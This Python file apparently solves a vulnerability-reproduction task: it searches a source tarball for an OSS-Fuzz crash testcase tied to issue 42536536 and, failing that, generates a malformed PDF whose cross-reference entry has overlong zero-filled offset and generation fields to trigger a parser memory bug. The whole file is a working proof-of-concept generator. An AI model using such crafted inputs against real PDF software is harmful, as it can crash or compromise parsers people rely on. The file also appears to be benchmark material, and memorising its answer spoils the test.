import os
import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = self._find_embedded_poc(src_path)
        if poc is not None:
            return poc
        return self._generate_synthetic_poc()

    def _find_embedded_poc(self, src_path: str) -> bytes | None:
        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return None

        candidates = []

        try:
            for member in tf.getmembers():
                if not member.isfile():
                    continue

                name_lower = member.name.lower()
                ext = os.path.splitext(name_lower)[1]

                key_substrings = (
                    "42536536",
                    "42536",
                    "oss-fuzz",
                    "clusterfuzz",
                    "poc",
                    "crash",
                    "bug",
                )

                # Prefer potential testcase files
                if ext not in (".pdf", ".bin", ".dat", ".input", ".fuzz", ".txt", ""):
                    if not any(s in name_lower for s in key_substrings):
                        continue

                if member.size == 0 or member.size > 5 * 1024 * 1024:
                    continue

                f = tf.extractfile(member)
                if f is None:
                    continue
                data = f.read()
                if not data:
                    continue

                if b"xref" not in data:
                    continue

                max_run = self._max_zero_run(data)
                if max_run < 20:
                    continue

                score = max_run
                if "42536536" in name_lower:
                    score += 1000
                elif "42536" in name_lower:
                    score += 500
                if (
                    "clusterfuzz" in name_lower
                    or "oss-fuzz" in name_lower
                    or "poc" in name_lower
                ):
                    score += 200

                candidates.append((score, len(data), data))
        finally:
            tf.close()

        if not candidates:
            return None

        candidates.sort(key=lambda x: (-x[0], x[1]))
        return candidates[0][2]

    def _max_zero_run(self, data: bytes) -> int:
        max_run = 0
        cur = 0
        for b in data:
            if b == 0x30:  # ASCII '0'
                cur += 1
                if cur > max_run:
                    max_run = cur
            else:
                cur = 0
        return max_run

    def _generate_synthetic_poc(self) -> bytes:
        header = b"%PDF-1.4\n"
        obj1 = b"1 0 obj\n<< /Type /Catalog >>\nendobj\n"

        xref_offset = len(header) + len(obj1)

        xref_lines = []
        xref_lines.append(b"xref\n")
        xref_lines.append(b"0 2\n")
        xref_lines.append(b"0000000000 65535 f \n")

        f1_zeros = b"0" * 200  # overlong offset field (f1)
        f2_zeros = b"0" * 50   # overlong generation field (f2)
        xref_lines.append(f1_zeros + b" " + f2_zeros + b" n \n")

        xref_section = b"".join(xref_lines)

        trailer = (
            b"trailer\n"
            b"<< /Size 2 /Root 1 0 R >>\n"
            b"startxref\n"
            + str(xref_offset).encode("ascii")
            + b"\n"
            b"%%EOF\n"
        )

        return header + obj1 + xref_section + trailer